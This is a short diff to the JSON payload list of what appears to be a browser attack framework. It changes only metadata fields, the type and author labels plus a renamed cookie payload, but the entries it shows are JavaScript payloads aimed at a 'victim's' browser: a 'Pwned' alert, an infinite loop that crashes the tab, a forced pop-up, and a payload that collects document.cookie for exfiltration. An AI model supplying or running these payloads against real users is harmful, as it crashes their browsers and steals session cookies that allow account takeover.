@@ -5,8 +5,8 @@
       "description": "Show a basic alert in the victims browser",
       "payload": "alert('Pwned by Wagyu!');",
       "compatibility": "All Browsers",
-      "type": "Misc",
-      "author": "Wagyu",
+      "type": "Misc.",
+      "author": "wagyu",
       "risk": 5
     },
     {
@@ -14,8 +14,8 @@
         "description": "Crash the victims browser tab",
         "payload": "let x = []; while(true){x.push('wagyu');}",
         "compatibility": "All Browsers",
-        "type": "Misc",
-        "author": "Wagyu",
+        "type": "Misc.",
+        "author": "wagyu",
         "risk": 5
     },
     {
@@ -23,17 +23,17 @@
         "description": "Rickroll the victim",
         "payload": "window.open('https://www.youtube.com/watch?v=dQw4w9WgXcQ');",
         "compatibility": "All Browsers",
-        "type": "Misc",
-        "author": "Wagyu",
+        "type": "Misc.",
+        "author": "wagyu",
         "risk": 5
     },
     {
-      "name": "steal-cookies",
-      "description": "Steal the victims cookies",
+      "name": "exfil-cookies",
+      "description": "Exfiltrate the victims cookies from the current tab",
       "payload": "setData('cookies', document.cookie);",
       "compatibility": "All Browsers",
       "type": "Data Exfiltration",
-      "author": "Wagyu",
+      "author": "wagyu",
       "risk": 1
     }
   ]
